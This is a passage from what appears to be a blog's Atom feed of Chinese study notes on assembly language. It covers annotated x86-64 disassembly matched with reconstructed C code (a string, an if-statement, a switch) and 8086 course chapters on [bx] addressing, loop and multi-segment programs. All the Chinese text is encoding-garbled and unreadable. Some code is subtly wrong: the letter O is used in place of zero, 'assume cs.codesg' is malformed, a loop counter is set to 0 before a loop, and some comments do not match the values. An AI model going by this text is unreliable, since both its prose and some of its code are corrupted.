;å°†å‡½æ•°ï¼ˆæ¯”å¦‚mainï¼‰çš„æ ˆåº•å‹åˆ°æ ˆ</span><br><span class="line">48 89 e5             mov    rbp,rsp   ;espå’Œebpéƒ½æŒ‡å‘æ ˆé¡¶</span><br><span class="line">48 b8 31 32 33 34 35  movabs rax,0x37363534333231  </span><br><span class="line">                                ;å°†ä¸€å †æ•°æ®å­˜å…¥raxå¯„å­˜å™¨ï¼Œå¯çŒœæµ‹æ˜¯å­—ç¬¦ä¸²&quot;7654321&quot;,cè¯­è¨€ä¸­ä¸€æ”¹</span><br><span class="line">36 37 00                        ;å­—ç¬¦ä¸²ä¸º&quot;7654321&quot;,çœ‹å‰é¢çš„16è¿›åˆ¶æ•°,åº”è¯¥ä¸º&quot;1234567&quot;</span><br><span class="line">48 89 45 f4         mov  QWORD PTR [rbp-0xc],rax ;å°†ç»™æ ˆä¸­ç›¸åº”çš„åœ°å€çš„å€¼æ”¹æˆraxå¯„å­˜å™¨ä¸­çš„å€¼</span><br><span class="line">c7 45 fc 02 00 00 00  mov  DWORD PTR [rbp-0x4],0x2  ;å°†ç»™æ ˆä¸­ç›¸åº”çš„åœ°å€çš„å€¼æ”¹æˆ2</span><br><span class="line">b8 00 00 00 00       mov    eax,0x0;å°†å¯„å­˜å™¨æ¢å¤ä¸º0</span><br><span class="line">5d                   pop    rbp;å°†å‡½æ•°è¿”å›çš„åœ°å€å¼¹å‡ºå¹¶è®°å½•</span><br><span class="line">c3                   ret                         ;è¿”å›å¼¹å‡ºçš„åœ°å€</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> b[<span class="number">8</span>] = <span class="string">&quot;1234567&quot;</span>;</span><br><span class="line"><span class="keyword">int</span> a=<span class="number">2</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ç¬¬ä¸‰é¢˜"><a href="#ç¬¬ä¸‰é¢˜" class="headerlink" title="ç¬¬ä¸‰é¢˜"></a>ç¬¬ä¸‰é¢˜</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">400457:55                   push  rbp</span><br><span class="line">400458:48 89 e5             mov   rbp,rsp</span><br><span class="line">40045b:c7 45 fc 02 00 00 00 mov   DWORD PTR [rbp-0x4],0x2;å°†ç»™æ ˆä¸­ç›¸åº”çš„åœ°å€çš„å€¼æ”¹æˆ2</span><br><span class="line">400462:83 7d fc 03          cmp   DWORD PTR [rbp-0x4],0x3;æ¯”è¾ƒæ ˆä¸­çš„åœ°å€ä¸0x3çš„å…³ç³»</span><br><span class="line">400466:7e 09                jle   400471 &lt;main+0x1a&gt;;å¾—çŸ¥æ˜¯æ¯”è¾ƒç±»ä¼¼ a&gt;3æ˜¯å¦æˆç«‹ ä¸æ˜¯åˆ™è·³è½¬</span><br><span class="line">400468:c7 45 f8 01 00 00 00 mov   DWORD PTR [rbp-0x8],0x1 </span><br><span class="line">                               ; a&gt;3æˆç«‹ï¼Œå°†ç»™æ ˆä¸­ç›¸åº”çš„åœ°å€çš„å€¼æ”¹æˆ1</span><br><span class="line">40046f:eb 07                jmp   400478 &lt;main+0x21&gt;      ; åˆ¤æ–­ç»“æŸ,è·³å‡ºåˆ¤æ–­</span><br><span class="line">400471:c7 45 f8 00 00 00 00 mov   DWORD PTR [rbp-0x8],0x0 </span><br><span class="line">                               ; å¯¹åº”ä¸Šé¢è·³è½¬æ¥çš„ï¼Œa&lt;=3 å°†ç»™æ ˆä¸­ç›¸åº”çš„åœ°å€çš„å€¼æ”¹æˆ0</span><br><span class="line">400478:b8 00 00 00 00       mov   eax,0x0   ;ä»ä¸Šé¢çš„åˆ†æå¯ä»¥åˆ¤æ–­ä¸ºifåˆ¤æ–­</span><br><span class="line">40047d:5d                   pop   rbp</span><br><span class="line">40047e:c3                   ret</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">2</span>,b;</span><br><span class="line"><span class="keyword">if</span>(a &gt; <span class="number">3</span>)</span><br><span class="line">b=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">b=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="é™„åŠ é¢˜"><a href="#é™„åŠ é¢˜" class="headerlink" title="é™„åŠ é¢˜"></a>é™„åŠ é¢˜</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">400457:55                   push   rbp</span><br><span class="line">400458:48 89 e5             mov    rbp,rsp</span><br><span class="line">40045b:c7 45 fc 02 00 00 00 mov    DWORD PTR [rbp-0x4],0x2 </span><br><span class="line">;å°†ç»™æ ˆä¸­ç›¸åº”çš„åœ°å€çš„å€¼æ”¹æˆ2</span><br><span class="line">400462:8b 45 fc             mov    eax,DWORD PTR [rbp-0x4] </span><br><span class="line">;å°†ç»™æ ˆä¸­ç›¸åº”çš„åœ°å€çš„å€¼å­˜åˆ°å¯„å­˜å™¨eaxä¸­</span><br><span class="line">400465:83 f8 02             cmp    eax,0x2 </span><br><span class="line">;æ¯”è¾ƒeaxå’Œ0x2</span><br><span class="line">400468:74 15                je     40047f &lt;main+0x28&gt; </span><br><span class="line">;å¦‚æœç›¸ç­‰å°±è·³è½¬</span><br><span class="line">40046a:83 f8 03             cmp    eax,0x3     </span><br><span class="line">;è¾ƒeaxå’Œ0x3</span><br><span class="line">40046d:74 19                je     400488 &lt;main+0x31&gt;      </span><br><span class="line">;å¦‚æœç›¸ç­‰å°±è·³è½¬</span><br><span class="line">40046f:83 f8 01             cmp    eax,0x1                 </span><br><span class="line">;è¾ƒeaxå’Œ0x3</span><br><span class="line">400472:74 02                je     400476 &lt;main+0x1f&gt;     </span><br><span class="line">;å¦‚æœç›¸ç­‰å°±è·³è½¬</span><br><span class="line">400474:eb 1a                jmp    400490 &lt;main+0x39&gt;      </span><br><span class="line">;éƒ½ä¸æ˜¯ï¼Œè·³å‡ºæ•´ä¸ªåˆ¤æ–­ï¼Œå¯ä»¥çœ‹å‡ºè¿™åº”è¯¥æ˜¯switch</span><br><span class="line">400476:c7 45 f8 02 00 00 00 mov    DWORD PTR [rbp-0x8],0x2 </span><br><span class="line">;å°†ç»™æ ˆä¸­ç›¸åº”çš„åœ°å€çš„å€¼æ”¹æˆ2</span><br><span class="line">40047d:eb 11                jmp    400490 &lt;main+0x39&gt;      </span><br><span class="line">;è·³å‡ºæ•´ä¸ªåˆ¤æ–­</span><br><span class="line">40047f:c7 45 fc 03 00 00 00 mov    DWORD PTR [rbp-0x4],0x3 </span><br><span class="line">;å°†ç»™æ ˆä¸­ç›¸åº”çš„åœ°å€çš„å€¼æ”¹æˆ3</span><br><span class="line">400486:eb 08                jmp    400490 &lt;main+0x39&gt;      </span><br><span class="line">;è·³å‡ºæ•´ä¸ªåˆ¤æ–­</span><br><span class="line">400488:c7 45 f8 01 00 00 00 mov    DWORD PTR [rbp-0x8],0x1 </span><br><span class="line">;å°†ç»™æ ˆä¸­ç›¸åº”çš„åœ°å€çš„å€¼æ”¹æˆ3</span><br><span class="line">40048f:90                   nop                            </span><br><span class="line">;ç»“æŸåˆ¤æ–­</span><br><span class="line">400490:b8 00 00 00 00       mov    eax,0x0</span><br><span class="line">400495:5d                   pop    rbp</span><br><span class="line">400496:c3                   ret  </span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">2</span>,b;</span><br><span class="line"><span class="keyword">switch</span>(a)</span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">b = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">a = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">b = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="æ„Ÿè°¢Prowes5å¸ˆå‚…"><a href="#æ„Ÿè°¢Prowes5å¸ˆå‚…" class="headerlink" title="æ„Ÿè°¢Prowes5å¸ˆå‚…"></a><strong>æ„Ÿè°¢Prowes5å¸ˆå‚…</strong></h1><p><a href="https://imgchr.com/i/BL2G7R"><img src="https://s1.ax1x.com/2020/11/10/BL2G7R.png" alt="BL2G7R.png"></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;æ±‡ç¼–å­¦ä¹ ç¬”è®°ç¬¬ä¸€æ¬¡&quot;&gt;&lt;a href=&quot;#æ±‡ç¼–å­¦ä¹ ç¬”è®°ç¬¬ä¸€æ¬¡&quot; class=&quot;headerlink&quot; title=&quot;æ±‡ç¼–å­¦ä¹ ç¬”è®°ç¬¬ä¸€æ¬¡&quot;&gt;&lt;/a&gt;æ±‡ç¼–å­¦ä¹ ç¬”è®°ç¬¬ä¸€æ¬¡&lt;/h1&gt;&lt;p&gt;æ„Ÿè°¢ä¹å“¥èƒ½èŠ±è´¹æ—¶é—´å’Œç²¾åŠ›æ¥å¸¦å¸¦å¼Ÿå¼Ÿï¼Œå¼Ÿå¼Ÿä¸€å®šåŠªåŠ›&lt;/p&gt;
&lt;p&gt;å€Ÿç€è¿™æ¬¡æœºä¼šï¼Œåˆšå¥½å¤</summary>
      
    
    
    
    <category term="æ±‡ç¼–" scheme="http://example.com/categories/%E6%B1%87%E7%BC%96/"/>
    
    
  </entry>
  
  <entry>
    <title>æ±‡ç¼–ç¬¬å…­ç« </title>
    <link href="http://example.com/2020/02/14/%E6%B1%87%E7%BC%96%E7%AC%AC%E5%85%AD%E7%AB%A0/"/>
    <id>http://example.com/2020/02/14/%E6%B1%87%E7%BC%96%E7%AC%AC%E5%85%AD%E7%AB%A0/</id>
    <published>2020-02-14T11:43:34.000Z</published>
    <updated>2021-08-13T07:34:51.894Z</updated>
    
    <content type="html"><![CDATA[<h1 id="åŒ…å«å¤šä¸ªæ®µçš„ç¨‹åº"><a href="#åŒ…å«å¤šä¸ªæ®µçš„ç¨‹åº" class="headerlink" title="åŒ…å«å¤šä¸ªæ®µçš„ç¨‹åº"></a>åŒ…å«å¤šä¸ªæ®µçš„ç¨‹åº</h1><h1 id="6-1åœ¨ä»£ç æ®µä¸­ä½¿ç”¨æ•°æ®"><a href="#6-1åœ¨ä»£ç æ®µä¸­ä½¿ç”¨æ•°æ®" class="headerlink" title="6.1åœ¨ä»£ç æ®µä¸­ä½¿ç”¨æ•°æ®"></a>6.1åœ¨ä»£ç æ®µä¸­ä½¿ç”¨æ•°æ®</h1><hr><p>assume cs.codesg<br>codesg segment<br>dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h<br>mov bx,0<br>mov ax,0<br>mov cx,8<br>s: add ax,cs:[bx]<br>add bx,2<br>loop s<br>mov ax,4c00h<br>int 21h<br>codesg ends<br>end</p><hr><p>dwçš„å«ä¹‰æ˜¯å®šä¹‰å­—å‹æ•°æ® define wordï¼ˆæ•°æ®ä¹‹é—´ç”¨é€—å·åˆ†éš”ï¼‰<br>dbçš„å«ä¹‰æ˜¯å®šä¹‰å•å­—èŠ‚æ•°æ®define byte<br>ä¸Šè¿°8ä¸ªå­—å‹æ•°æ®å­˜æ”¾åœ¨CSä»£ç æ®µé‡Œ<br>å› ä¸ºç”¨dwå®šä¹‰çš„æ•°æ®å¤„äºä»£ç æ®µçš„æœ€å¼€å§‹ï¼Œæ‰€ä»¥åç§»åœ°å€ä¸º0ï¼Œè¿™8ä¸ªæ•°æ®å°±åœ¨ä»£ç æ®µçš„åç§»0ã€2ã€4ã€6ã€8ã€Aã€Cã€Eå¤„ã€‚<br><strong>å¦‚æœéœ€è¦è®©ç¨‹åºåœ¨ç¼–è¯‘åå¯ä»¥å­˜ç³»ç»Ÿä¸­ç›´æ¥è¿è¡Œï¼Œæˆ‘ä»¬éœ€è¦åœ¨æºç¨‹åºä¸­æŒ‡æ˜ç¨‹åºçš„å…¥å£</strong></p><hr><p>assume cs.codesg<br>codesg segment<br>dw 0123h,0456h,0789h,0abch,Odefh,0fedh,0cbah,0987h<br>start: mov bx,0<br>mov ax,O<br>mov cx,8<br>s: add ax,cs:[bx]<br>add bx,2<br>loop s<br>mov ax,4c00h<br>int 21h<br>codesg ends</p><p>end start </p><p><strong>endé™¤äº†é€šçŸ¥ç¼–è¯‘å™¨ç¨‹åºç»“æŸå¤–ï¼Œè¿˜å¯ä»¥é€šçŸ¥ç¼–è¯‘å™¨ç¨‹åºçš„å…¥å£åœ¨ä»€ä¹ˆåœ°æ–¹ã€‚</strong></p><h1 id="6-2åœ¨ä»£ç æ®µä¸­ä½¿ç”¨æ ˆ"><a href="#6-2åœ¨ä»£ç æ®µä¸­ä½¿ç”¨æ ˆ" class="headerlink" title="6.2åœ¨ä»£ç æ®µä¸­ä½¿ç”¨æ ˆ"></a>6.2åœ¨ä»£ç æ®µä¸­ä½¿ç”¨æ ˆ</h1><hr><p>codesg segment<br>dw 0123H,0456H, 0789H, 0abcH, 0defH, 0fedH,0cbaH,0987H<br>dw 0,0,0,0,0,0,0,0    ;ç”¨dwå®šä¹‰8ä¸ªå­—å‹æ•°æ®ï¼Œåœ¨ç¨‹åºåŠ è½½åï¼Œå°†å–å¾—8ä¸ªå­—çš„<br>;å†…å­˜ç©ºé—´ï¼Œå­˜æ”¾è¿™8ä¸ªæ•°æ®ã€‚æˆ‘ä»¬åœ¨åé¢çš„ç¨‹åºä¸­å°†è¿™æ®µ<br>;ç©ºé—´å½“ä½œæ ˆæ¥ä½¿ç”¨ã€‚<br>start: mov ax, cs<br>mov ss, ax<br>mov sp,32 ;è®¾ç½®æ ˆé¡¶ss:spæŒ‡å‘cs:32<br>mov bx,0<br>mov cx, 8<br>s: push cs: [bx]<br>add bx,2<br>loop s ;ä»¥ä¸Šå°†ä»£ç æ®µ0<del>16å•å…ƒä¸­çš„8ä¸ªå­—å‹æ•°æ®ä¾æ¬¡å…¥æ ˆ<br>mov bx, 0<br>mov cx, 8<br>s0: pop cs: [bx]<br>add bx,2<br>loop s0;ä»¥ä¸Šä¾æ¬¡å‡ºæ ˆ8ä¸ªå­—å‹æ•°æ®åˆ°ä»£ç æ®µ0</del>16å•å…ƒä¸­<br>mov ax, 4c00h<br>int 21h<br>codesg ends</p><p>end start ;æŒ‡æ˜ç¨‹åºçš„å…¥å£åœ¨startå¤„</p><h1 id="6-3å°†æ•°æ®ã€ä»£ç ã€æ ˆæ”¾å…¥ä¸åŒçš„æ®µ"><a href="#6-3å°†æ•°æ®ã€ä»£ç ã€æ ˆæ”¾å…¥ä¸åŒçš„æ®µ" class="headerlink" title="6.3å°†æ•°æ®ã€ä»£ç ã€æ ˆæ”¾å…¥ä¸åŒçš„æ®µ"></a>6.3å°†æ•°æ®ã€ä»£ç ã€æ ˆæ”¾å…¥ä¸åŒçš„æ®µ</h1><h2 id="ä½†å¦‚æœæ•°æ®ã€æ ˆå’Œä»£ç éœ€è¦çš„ç©ºé—´è¶…è¿‡64KBï¼Œå°±ä¸èƒ½æ”¾åœ¨ä¸€ä¸ªæ®µä¸­-ä¸€ä¸ªæ®µçš„å®¹é‡ä¸èƒ½å¤§äº64KBï¼Œæ˜¯æˆ‘ä»¬åœ¨å­¦ä¹ ä¸­æ‰€ç”¨çš„8086æ¨¡å¼çš„é™åˆ¶ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰çš„å¤„ç†å™¨éƒ½è¿™æ ·-ã€‚"><a href="#ä½†å¦‚æœæ•°æ®ã€æ ˆå’Œä»£ç éœ€è¦çš„ç©ºé—´è¶…è¿‡64KBï¼Œå°±ä¸èƒ½æ”¾åœ¨ä¸€ä¸ªæ®µä¸­-ä¸€ä¸ªæ®µçš„å®¹é‡ä¸èƒ½å¤§äº64KBï¼Œæ˜¯æˆ‘ä»¬åœ¨å­¦ä¹ ä¸­æ‰€ç”¨çš„8086æ¨¡å¼çš„é™åˆ¶ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰çš„å¤„ç†å™¨éƒ½è¿™æ ·-ã€‚" class="headerlink" title="ä½†å¦‚æœæ•°æ®ã€æ ˆå’Œä»£ç éœ€è¦çš„ç©ºé—´è¶…è¿‡64KBï¼Œå°±ä¸èƒ½æ”¾åœ¨ä¸€ä¸ªæ®µä¸­(ä¸€ä¸ªæ®µçš„å®¹é‡ä¸èƒ½å¤§äº64KBï¼Œæ˜¯æˆ‘ä»¬åœ¨å­¦ä¹ ä¸­æ‰€ç”¨çš„8086æ¨¡å¼çš„é™åˆ¶ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰çš„å¤„ç†å™¨éƒ½è¿™æ ·)ã€‚"></a>ä½†å¦‚æœæ•°æ®ã€æ ˆå’Œä»£ç éœ€è¦çš„ç©ºé—´è¶…è¿‡64KBï¼Œå°±ä¸èƒ½æ”¾åœ¨ä¸€ä¸ªæ®µä¸­(ä¸€ä¸ªæ®µçš„å®¹é‡ä¸èƒ½å¤§äº64KBï¼Œæ˜¯æˆ‘ä»¬åœ¨å­¦ä¹ ä¸­æ‰€ç”¨çš„8086æ¨¡å¼çš„é™åˆ¶ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰çš„å¤„ç†å™¨éƒ½è¿™æ ·)ã€‚</h2><p>assume cs:code ds:data ss:stack</p><p>data segment<br>     dw 0123H,0456H, 0789H,0abcH,0defH, 0fedH,0cbaH,0987H<br>data ends</p><p>stack segment<br>     dw 0,0,0,0,0,0,0,0<br>stack  ends</p><p>code segment<br>start: mov ax,stack<br>mov ss,ax<br>mov sp,16<br>mov ax,data<br>mov ds,ax<br>mov cx,8<br>s:push [bx]<br>add bx,2<br>loop s</p><p>mov bx,0<br>mov cx,0<br>s0:pop [bx]<br>add bx,2<br>loop s0<br>mov ax,4c00h<br>int 21h<br>code ends</p><p>end start</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;åŒ…å«å¤šä¸ªæ®µçš„ç¨‹åº&quot;&gt;&lt;a href=&quot;#åŒ…å«å¤šä¸ªæ®µçš„ç¨‹åº&quot; class=&quot;headerlink&quot; title=&quot;åŒ…å«å¤šä¸ªæ®µçš„ç¨‹åº&quot;&gt;&lt;/a&gt;åŒ…å«å¤šä¸ªæ®µçš„ç¨‹åº&lt;/h1&gt;&lt;h1 id=&quot;6-1åœ¨ä»£ç æ®µä¸­ä½¿ç”¨æ•°æ®&quot;&gt;&lt;a href=&quot;#6-1åœ¨ä»£ç æ®µä¸­ä½¿ç”¨æ•°æ®&quot; cla</summary>
      
    
    
    
    <category term="æ±‡ç¼–" scheme="http://example.com/categories/%E6%B1%87%E7%BC%96/"/>
    
    
  </entry>
  
  <entry>
    <title>æ±‡ç¼–ç¬¬äº”ç« </title>
    <link href="http://example.com/2020/02/13/%E6%B1%87%E7%BC%96%E7%AC%AC%E4%BA%94%E7%AB%A0/"/>
    <id>http://example.com/2020/02/13/%E6%B1%87%E7%BC%96%E7%AC%AC%E4%BA%94%E7%AB%A0/</id>
    <published>2020-02-13T15:25:22.000Z</published>
    <updated>2021-08-13T07:33:50.892Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BX-å’ŒloopæŒ‡ä»¤"><a href="#BX-å’ŒloopæŒ‡ä»¤" class="headerlink" title="[BX]å’ŒloopæŒ‡ä»¤"></a>[BX]å’ŒloopæŒ‡ä»¤</h1><h1 id="5-1-bx"><a href="#5-1-bx" class="headerlink" title="5.1 [bx]"></a>5.1 [bx]</h1><p>[bx]</p><p>assume cs:kk</p><p>kk segment</p><p>nn:   mov ax,2000H<br>      mov ds,ax<br>      mov al,[0]//ç­‰äºmov al,0<br>      mov bl,[1]//ç­‰äºmov bl,1<br>      mov cl,[3]<br>      mov dl,[4]   </p><p>mov ax,4c00H<br>int 21H</p><p>kk ends<br>end nn<br>ç”¨ç¼–è¾‘å™¨å’Œdebugå†™çš„å‘½ä»¤ä¸åŒ<br>[bx]è¡¨ç¤ºä¸€ä¸ªå†…å­˜å•å…ƒï¼Œå®ƒçš„åç§»åœ°å€åœ¨bxä¸­ï¼Œæ¯”å¦‚<br>ä¸èƒ½<br>mov ax,[0]<br>åªèƒ½<br>mov bx,0<br>mov ax,[bx]<br>mov al,[bx]</p><h1 id="loop-å¾ªç¯"><a href="#loop-å¾ªç¯" class="headerlink" title="loop å¾ªç¯"></a>loop å¾ªç¯</h1><p>æè¿°æ€§ç¬¦å·â€()â€<br>(ax)=0010H<br>2000:1000å¤„çš„å†…å®¹ä¸º0010H<br>(21000H)=0010H<br>å¯¹äºmov ax,[2]çš„åŠŸèƒ½<br>(ax)=((ds)*16+2)<br>å¯¹äºmov [3],axçš„åŠŸèƒ½<br>((ds)*16+2)=(ax)<br>å¯¹äºadd ax,2çš„åŠŸèƒ½<br>(ax)=(ax)+2<br>å¯¹äºadd ax,bxçš„åŠŸèƒ½<br>(ax)=(ax)+(bx)<br>å¯¹äºpush axçš„åŠŸèƒ½<br>(sp)=(sp)-2<br>((ss)*16+(sp))=(ax)<br>å¯¹äºpop axçš„åŠŸèƒ½<br>(ax)=((ss)<em>16+(sp))<br>(sp)=(sp)+2<br>çº¦å®šç¬¦å·idataï¼ˆæˆ‘çš„æ•°æ®//å¸¸é‡ï¼‰<br><strong>mov ax,[idata]å°±ä»£è¡¨mov ax,[1]ã€mov ax,[2]ã€mov ax,[3]ç­‰</strong><br><strong>mov bx,idataå°±ä»£è¡¨mov bx,1ã€mov bx,2ã€mov bx,3ç­‰</strong><br><strong>mov ds,idataå°±ä»£è¡¨mov ds,1.ã€‚ã€‚ã€‚ä½†æ˜¯è¿™æ˜¯é”™è¯¯çš„ï¼Œéæ³•çš„</strong><br>mov ax,[bx]<br>åŠŸèƒ½: bxä¸­å­˜æ”¾çš„æ•°æ®ä½œä¸ºä¸€ä¸ªåç§»åœ°å€EAï¼Œæ®µåœ°å€SAé»˜è®¤åœ¨dsä¸­ï¼Œå°†SA:EAå¤„çš„æ•°æ®é€å…¥axä¸­ã€‚<br>(ax)=(ds</em>16+(bx))<br>mov| bx ,ax<br>åŠŸèƒ½:bxä¸­å­˜æ”¾çš„æ•°æ®ä½œä¸ºä¸€ä¸ªåç§»åœ°å€EAï¼Œæ®µåœ°å€SAé»˜è®¤åœ¨dsä¸­ï¼Œå°†axä¸­çš„æ•°æ®é€å…¥å†…å­˜SA:EAå¤„ã€‚<br>(ds *16 +(bx)) = (ax)</p><h1 id="inc-bxçš„å«ä¹‰æ˜¯nxä¸­çš„å†…å®¹åŠ 1"><a href="#inc-bxçš„å«ä¹‰æ˜¯nxä¸­çš„å†…å®¹åŠ 1" class="headerlink" title="inc bxçš„å«ä¹‰æ˜¯nxä¸­çš„å†…å®¹åŠ 1"></a>inc bxçš„å«ä¹‰æ˜¯nxä¸­çš„å†…å®¹åŠ 1</h1><p>mov bxï¼Œ1<br>inc bx<br>bx=2</p><h1 id="5-2-loopæŒ‡ä»¤"><a href="#5-2-loopæŒ‡ä»¤" class="headerlink" title="5.2 loopæŒ‡ä»¤"></a>5.2 loopæŒ‡ä»¤</h1><p>æŒ‡ä»¤çš„æ ¼å¼æ˜¯:loopæ ‡å·ï¼ŒCPUæ‰§è¡ŒloopæŒ‡ä»¤<br>(cx)=(cx)-1<br>åˆ¤æ–­cxä¸­çš„å€¼ï¼Œä¸ä¸ºé›¶åˆ™è½¬è‡³æ ‡å·å¤„æ‰§è¡Œç¨‹åºï¼Œå¦‚æœä¸ºé›¶åˆ™å‘ä¸‹æ‰§è¡Œã€‚<br>cxçš„å€¼å½±å“ç€loopæŒ‡ä»¤çš„æ‰§è¡Œç»“æœ<br>Cxä¸­å­˜æ”¾å¾ªç¯æ¬¡æ•°<br>2^2</p><p>assume cs:code<br>code segment<br>     mov ax,2<br>     add ax,ax</p><p>mov ax,4c00H<br>int 21H<br>code ends</p><p>end</p><hr><p>2^3</p><p>assume cs:code</p><p>code segment<br>   mov ax,2<br>   add ax,ax<br>   add ax,ax</p><p>   mov ax,4c00H<br>   int 21H<br>code ends</p><p>end</p><hr><p>2^12<br>Assume cs:code<br>code segment<br>mov ax,2<br>mov cx,11<br>s: add ax,ax<br>loop s//sä¸ºæ ‡å·</p><p>mov ax,4c00H<br>int 21H<br>code ends<br>end<br>(1)æ ‡å·<br>åœ¨æ±‡ç¼–è¯­è¨€ä¸­ï¼Œæ ‡å·ä»£è¡¨ä¸€ä¸ªåœ°å€ï¼Œæ­¤ç¨‹åºä¸­æœ‰ä¸€ä¸ªæ ‡å·sã€‚å®ƒå®é™…ä¸Šæ ‡è¯†äº†ä¸€ä¸ªåœ°å€ï¼Œè¿™ä¸ªåœ°å€å¤„æœ‰ä¸€æ¡æŒ‡ä»¤: add ax,axã€‚<br>(2)loop s<br>CPUæ‰§è¡Œloop sçš„æ—¶å€™ï¼Œè¦è¿›è¡Œä¸¤æ­¥æ“ä½œ:<br>â‘ (cx)=(cx)-1 ;<br>â‘¡åˆ¤æ–­cxä¸­çš„å€¼ï¼Œä¸ä¸º0åˆ™è½¬è‡³æ ‡å·sæ‰€æ ‡è¯†çš„åœ°å€å¤„æ‰§è¡Œ(è¿™é‡Œçš„æŒ‡ä»¤æ˜¯â€œadd ax,ax)ï¼Œå¦‚æœä¸ºé›¶åˆ™æ‰§è¡Œä¸‹ä¸€æ¡æŒ‡ä»¤(ä¸‹ä¸€æ¡æŒ‡ä»¤æ˜¯mov ax,4c00h)ã€‚<br>(3)ä»¥ä¸‹ä¸‰æ¡æŒ‡ä»¤<br>mov cx,1 1<br>s: add ax,ax<br>loop s<br>æ‰§è¡Œloop sæ—¶ï¼Œé¦–å…ˆè¦å°†(cx)å‡1ï¼Œç„¶åè‹¥(cx)ä¸ä¸º0ï¼Œåˆ™å‘å‰è½¬è‡³så¤„æ‰§è¡Œadd ax,axã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨cxæ¥æ§åˆ¶add ax,axçš„æ‰§è¡Œæ¬¡æ•°<br>loopæŒ‡ä»¤<br>(1)åœ¨cxä¸­å­˜æ”¾å¾ªç¯æ¬¡æ•°;<br>(2)loopæŒ‡ä»¤ä¸­çš„æ ‡å·æ‰€æ ‡è¯†åœ°å€è¦åœ¨å‰é¢;<br>(3)è¦å¾ªç¯æ‰§è¡Œçš„ç¨‹åºæ®µï¼Œè¦å†™åœ¨æ ‡å·å’ŒloopæŒ‡ä»¤çš„ä¸­é—´ã€‚<br>mov 